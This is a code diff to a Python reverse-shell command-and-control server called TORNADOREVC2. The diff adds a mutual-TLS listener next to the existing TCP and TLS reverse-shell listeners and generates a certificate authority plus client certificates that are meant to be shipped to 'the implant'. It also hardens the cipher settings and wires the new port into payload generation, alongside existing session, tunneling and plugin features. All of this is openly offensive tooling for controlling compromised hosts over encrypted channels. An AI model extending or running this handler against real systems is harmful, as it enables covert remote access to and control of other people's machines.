@@ -57,14 +57,38 @@ from .tunnel import TunnelManager
 from .updater import Updater
 from .plugins import PluginManager
 
+def _detect_mtls(client_sock):
+    if not isinstance(client_sock, ssl.SSLSocket):
+        return False
+    try:
+        return bool(client_sock.getpeercert())
+    except Exception:
+        return False
 
 class TORNADOREVC2:
-    def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, certfile='server.pem', keyfile='server.key'):
+    def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, mtls_port=9443,
+                 certfile=os.path.join('tls_certs', 'server.pem'),
+                 keyfile=os.path.join('tls_certs', 'server.key'),
+                 mtls_ca_cert=os.path.join('mtls_certs', 'ca.pem'),
+                 mtls_ca_key=os.path.join('mtls_certs', 'ca.key'),
+                 mtls_server_cert=os.path.join('mtls_certs', 'server-mtls.pem'),
+                 mtls_server_key=os.path.join('mtls_certs', 'server-mtls.key'),
+                 mtls_client_cert=os.path.join('mtls_certs', 'client.pem'),
+                 mtls_client_key=os.path.join('mtls_certs', 'client.key')):
         self.host = host
         self.revshell_port = revshell_port
         self.tls_port = tls_port
+        self.mtls_port = mtls_port
         self.certfile = certfile
         self.keyfile = keyfile
+        self.mtls_ca_cert = mtls_ca_cert
+        self.mtls_ca_key = mtls_ca_key
+        self.mtls_server_cert = mtls_server_cert
+        self.mtls_server_key = mtls_server_key
+        self.mtls_client_cert = mtls_client_cert
+        self.mtls_client_key = mtls_client_key
+        self.tls_cert_dir = os.path.dirname(certfile) or '.'
+        self.mtls_cert_dir = os.path.dirname(mtls_ca_cert) or '.'
         self.revshell_clients = {}
         self.client_counter = 0
         self.running = False
@@ -79,6 +103,7 @@ class TORNADOREVC2:
         self.updater = Updater(self)
         self._tcp_server = None
         self._tls_server = None
+        self._mtls_server = None
         self.colors = {
             'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
             'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
@@ -86,7 +111,7 @@ class TORNADOREVC2:
         self.payloads = self._build_payloads()
 
     def _build_payloads(self):
-        return get_payloads(self.host, self.revshell_port, self.tls_port)
+        return get_payloads(self.host, self.revshell_port, self.tls_port, self.mtls_port)
 
     def print_banner(self):
         banner = f"""
@@ -107,6 +132,7 @@ class TORNADOREVC2:
             f"{self.colors['green']}Listeners:{self.colors['end']}\n"
             f"  {self.colors['cyan']}TCP{self.colors['end']} {self.host}:{self.revshell_port}\n"
             f"  {self.colors['cyan']}TLS{self.colors['end']} {self.host}:{self.tls_port}\n"
+            f"  {self.colors['cyan']}MTLS{self.colors['end']} {self.host}:{self.mtls_port}\n"
             f"{self.colors['green']}Active Sessions:{self.colors['end']} {active}\n"
         )
 
@@ -263,7 +289,12 @@ class TORNADOREVC2:
     def print_payloads(self):
         for category, payloads in self.payloads.items():
             print(f"{self.colors['bold']}{category}:{self.colors['end']}")
+            note = payloads.get('__note__')
+            if note:
+                print(f"  {self.colors['yellow']}NOTE:{self.colors['end']} {note}\n")
             for name, payload in payloads.items():
+                if name == '__note__':
+                    continue
                 print(f"  {self.colors['green']}{name}{self.colors['end']} {self.colors['yellow']}{payload}")
             print()
 
@@ -274,6 +305,9 @@ class TORNADOREVC2:
         if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
             return
 
+        self._ensure_dir_for(self.certfile)
+        self._ensure_dir_for(self.keyfile)
+
         openssl = self._openssl_executable()
         cmd = [
             openssl, 'req', '-x509', '-newkey', 'rsa:2048', '-sha256', '-nodes',
@@ -283,26 +317,35 @@ class TORNADOREVC2:
             '-subj', '/CN=localhost',
         ]
         print(
-            f"{self.colors['yellow']}TLS certificate not found; generating "
-            f"{self.certfile} and {self.keyfile}...{self.colors['end']}"
+            f"\n{self.colors['yellow']}{self.colors['bold']}[TLS]{self.colors['end']} "
+            f"{self.colors['yellow']}No TLS certificate found — generating a new self-signed pair."
+            f"{self.colors['end']}"
         )
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Certificate : {self.certfile}")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Private key : {self.keyfile}")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Validity    : 3650 days (10 years)")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Subject     : CN=localhost")
+
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, check=False)
         except FileNotFoundError:
             print(
-                f"{self.colors['red']}Failed to automatically generate self-signed TLS certificate: "
-                f"{openssl} not found. Install OpenSSL and ensure it is on PATH.{self.colors['end']}"
+                f"{self.colors['red']}[TLS] Failed: {openssl} not found on PATH. "
+                f"Install OpenSSL and try again.{self.colors['end']}"
             )
             sys.exit(1)
 
         if result.returncode != 0:
             detail = (result.stderr or result.stdout or 'unknown error').strip()
-            print(f"{self.colors['red']}Failed to generate TLS certificate:{self.colors['end']}")
+            print(f"{self.colors['red']}[TLS] Certificate generation failed:{self.colors['end']}")
             if detail:
-                print(detail)
+                print(f"  {detail}")
             sys.exit(1)
 
-        print(f"{self.colors['green']}TLS certificate generated successfully.{self.colors['end']}")
+        print(
+            f"{self.colors['green']}[TLS] Certificate generated successfully."
+            f"{self.colors['end']}\n"
+        )
 
     def create_tls_context(self):
         if not os.path.exists(self.certfile):
@@ -311,6 +354,124 @@ class TORNADOREVC2:
             raise FileNotFoundError(f"Key not found: {self.keyfile}")
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
+        context.minimum_version = ssl.TLSVersion.TLSv1_2
+        context.set_ciphers(
+            "ECDHE-ECDSA-AES256-GCM-SHA384:"
+            "ECDHE-RSA-AES256-GCM-SHA384:"
+            "ECDHE-ECDSA-AES128-GCM-SHA256:"
+            "ECDHE-RSA-AES128-GCM-SHA256:"
+            "ECDHE-ECDSA-CHACHA20-POLY1305:"
+            "ECDHE-RSA-CHACHA20-POLY1305"
+        )
+        context.options |= ssl.OP_NO_COMPRESSION
+        context.options |= ssl.OP_NO_RENEGOTIATION
+        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
+        try:
+            context.set_ecdh_curve("X25519")
+        except ssl.SSLError:
+            context.set_ecdh_curve("prime256v1")
+        return context
+
+    @staticmethod
+    def _ensure_dir_for(path):
+        d = os.path.dirname(path)
+        if d:
+            os.makedirs(d, exist_ok=True)
+
+    def _run_openssl(self, cmd, label):
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, check=False)
+        except FileNotFoundError:
+            print(
+                f"{self.colors['red']}Failed to run "
+                f"{self._openssl_executable()}: not found on PATH.{self.colors['end']}"
+            )
+            sys.exit(1)
+        if result.returncode != 0:
+            detail = (result.stderr or result.stdout or 'unknown error').strip()
+            print(f"{self.colors['red']}{label} failed:{self.colors['end']}")
+            if detail:
+                print(detail)
+            sys.exit(1)
+
+    def ensure_mtls_certificates(self):
+        needed = [
+            self.mtls_ca_cert, self.mtls_ca_key,
+            self.mtls_server_cert, self.mtls_server_key,
+            self.mtls_client_cert, self.mtls_client_key,
+        ]
+        if all(os.path.exists(p) for p in needed):
+            return
+
+        self._ensure_dir_for(self.mtls_ca_cert)
+
+        openssl = self._openssl_executable()
+        print(
+            f"\n{self.colors['yellow']}{self.colors['bold']}[mTLS]{self.colors['end']} "
+            f"{self.colors['yellow']}mTLS material missing — bootstrapping a fresh PKI."
+            f"{self.colors['end']}"
+        )
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Output dir   : {self.mtls_cert_dir}{os.sep}")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} CA           : 4096-bit RSA, valid 3650 days")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Server cert  : CN=localhost, signed by CA")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Client cert  : CN=tornado-client, signed by CA")
+        print(f"  {self.colors['cyan']}→{self.colors['end']} Client bundle: ship client.pem + client.key + ca.pem to the implant")
+
+        self._run_openssl([
+            openssl, 'req', '-x509', '-newkey', 'rsa:4096', '-sha256', '-nodes',
+            '-days', '3650',
+            '-keyout', self.mtls_ca_key,
+            '-out',    self.mtls_ca_cert,
+            '-subj',   '/CN=TornadoRevC2-mTLS-CA',
+        ], 'CA generation')
+
+        server_csr = self.mtls_server_cert + '.csr'
+        client_csr = self.mtls_client_cert + '.csr'
+
+        self._run_openssl([
+            openssl, 'req', '-newkey', 'rsa:2048', '-sha256', '-nodes',
+            '-keyout', self.mtls_server_key,
+            '-out',    server_csr,
+            '-subj',   '/CN=localhost',
+        ], 'Server CSR generation')
+
+        self._run_openssl([
+            openssl, 'x509', '-req', '-in', server_csr,
+            '-CA', self.mtls_ca_cert, '-CAkey', self.mtls_ca_key, '-CAcreateserial',
+            '-out', self.mtls_server_cert, '-days', '3650', '-sha256',
+        ], 'Server certificate signing')
+
+        self._run_openssl([
+            openssl, 'req', '-newkey', 'rsa:2048', '-sha256', '-nodes',
+            '-keyout', self.mtls_client_key,
+            '-out',    client_csr,
+            '-subj',   '/CN=tornado-client',
+        ], 'Client CSR generation')
+
+        self._run_openssl([
+            openssl, 'x509', '-req', '-in', client_csr,
+            '-CA', self.mtls_ca_cert, '-CAkey', self.mtls_ca_key, '-CAcreateserial',
+            '-out', self.mtls_client_cert, '-days', '3650', '-sha256',
+        ], 'Client certificate signing')
+
+        for csr in (server_csr, client_csr):
+            try:
+                os.remove(csr)
+            except OSError:
+                pass
+
+        print(f"{self.colors['green']}[mTLS] PKI initialized successfully.{self.colors['end']}")
+
+    def create_mtls_context(self):
+        for path in (self.mtls_server_cert, self.mtls_server_key, self.mtls_ca_cert):
+            if not os.path.exists(path):
+                raise FileNotFoundError(f"mTLS file not found: {path}")
+
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=self.mtls_server_cert, keyfile=self.mtls_server_key)
+        context.verify_mode = ssl.CERT_REQUIRED
+        context.check_hostname = False
+        context.load_verify_locations(cafile=self.mtls_ca_cert)
         context.minimum_version = ssl.TLSVersion.TLSv1_2
         context.set_ciphers(
             "ECDHE-ECDSA-AES256-GCM-SHA384:"
@@ -792,7 +953,14 @@ class TORNADOREVC2:
             for sock, info in self.revshell_clients.items():
                 if sock.fileno() != -1:
                     status = "CURRENT" if sock == self.current_client else ""
-                    proto = "TLS" if info.get('tls') else "TCP"
+
+                    if info.get('mtls'):
+                        proto = "MTLS"
+                    elif info.get('tls'):
+                        proto = "TLS"
+                    else:
+                        proto = "TCP"
+
                     display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
                     sysinfo = info.get('sysinfo') or {}
                     host = sysinfo.get('hostname', '?')
@@ -1285,6 +1453,7 @@ class TORNADOREVC2:
         self.running = False
         self._close_listener(self._tcp_server)
         self._close_listener(self._tls_server)
+        self._close_listener(self._mtls_server)
         self.tunnels.shutdown_for_restart()
         with self.client_lock:
             clients = list(self.revshell_clients.keys())
@@ -1310,6 +1479,7 @@ class TORNADOREVC2:
             'id': None,
             'name': None,
             'tls': isinstance(client_sock, ssl.SSLSocket),
+            'mtls': _detect_mtls(client_sock),
             'pty': False,
             'init': False,
             'sysinfo': None,
@@ -1424,27 +1594,45 @@ class TORNADOREVC2:
         if self.host == '0.0.0.0':
             print(
                 f"{self.colors['yellow']}{self.colors['bold']}WARNING:{self.colors['end']} "
-                f"{self.colors['yellow']}Handler bound to 0.0.0.0. "
-                f"Functionalities involving file uploading (file download doesn't affect) to Windows clients "
-                f"(upload, ligolo, or any other tunneling plugins and features supported by Tornado, etc.) "
-                f"will not work because it uses an HTTP server on the operator side to host the file and "
-                f"Invoke-WebRequest to retrieve it by the Windows session.{self.colors['end']}\n"
+                f"{self.colors['yellow']}The handler is currently bound to 0.0.0.0. "
+                f"This configuration may cause issues only when operating with Windows sessions "
+                f"and using HTTP-based file-upload functionality, such as the upload feature, "
+                f"ligolo, or other plugins that require the operator to host a file over HTTP "
+                f"for retrieval by the Windows session. "
+                f"File downloads from Windows targets are not affected, and any Linux-related "
+                f"functionality is not affected by this configuration. "
+                f"If possible, use a specific, reachable handler IP address for Windows "
+                f"HTTP-based file-upload functionality.{self.colors['end']}\n"
             )
         self.ensure_tls_certificates()
+        self.ensure_mtls_certificates()
+
         tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tcp_server.bind((self.host, self.revshell_port))
         tcp_server.listen(100)
+
         tls_context = self.create_tls_context()
         tls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tls_server.bind((self.host, self.tls_port))
         tls_server.listen(100)
+
+        mtls_context = self.create_mtls_context()
+        mtls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        mtls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        mtls_server.bind((self.host, self.mtls_port))
+        mtls_server.listen(100)
+
         self._tcp_server = tcp_server
         self._tls_server = tls_server
+        self._mtls_server = mtls_server
         self.running = True
+
         threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
         threading.Thread(target=self.listener, args=(tls_server, True, tls_context), daemon=True).start()
+        threading.Thread(target=self.listener, args=(mtls_server, True, mtls_context), daemon=True).start()
+
         self._init_readline()
         self.main_menu()
         self.running = False
@@ -1469,12 +1657,30 @@ def main():
     parser.add_argument('-H', '--host', default='0.0.0.0', help='Bind address')
     parser.add_argument('-p', '--port', type=int, default=4444, help='TCP listener port')
     parser.add_argument('-tp', '--tls-port', type=int, default=8443, help='TLS listener port')
-    parser.add_argument('-c', '--cert', default='server.pem', help='TLS certificate file')
-    parser.add_argument('-k', '--key', default='server.key', help='TLS private key file')
+    parser.add_argument('-mp', '--mtls-port', type=int, default=9443, help='mTLS listener port')
+    parser.add_argument('-c', '--cert', default=os.path.join('tls_certs', 'server.pem'), help='TLS certificate file')
+    parser.add_argument('-k', '--key', default=os.path.join('tls_certs', 'server.key'), help='TLS private key file')
+    parser.add_argument('--mtls-ca-cert', default=os.path.join('mtls_certs', 'ca.pem'))
+    parser.add_argument('--mtls-ca-key', default=os.path.join('mtls_certs', 'ca.key'))
+    parser.add_argument('--mtls-server-cert', default=os.path.join('mtls_certs', 'server-mtls.pem'))
+    parser.add_argument('--mtls-server-key', default=os.path.join('mtls_certs', 'server-mtls.key'))
+    parser.add_argument('--mtls-client-cert', default=os.path.join('mtls_certs', 'client.pem'))
+    parser.add_argument('--mtls-client-key', default=os.path.join('mtls_certs', 'client.key'))
     args = parser.parse_args()
+
     srv = TORNADOREVC2(
-        host=args.host, revshell_port=args.port, tls_port=args.tls_port,
-        certfile=args.cert, keyfile=args.key,
+        host=args.host,
+        revshell_port=args.port,
+        tls_port=args.tls_port,
+        mtls_port=args.mtls_port,
+        certfile=args.cert,
+        keyfile=args.key,
+        mtls_ca_cert=args.mtls_ca_cert,
+        mtls_ca_key=args.mtls_ca_key,
+        mtls_server_cert=args.mtls_server_cert,
+        mtls_server_key=args.mtls_server_key,
+        mtls_client_cert=args.mtls_client_cert,
+        mtls_client_key=args.mtls_client_key,
     )
     srv.start()
 
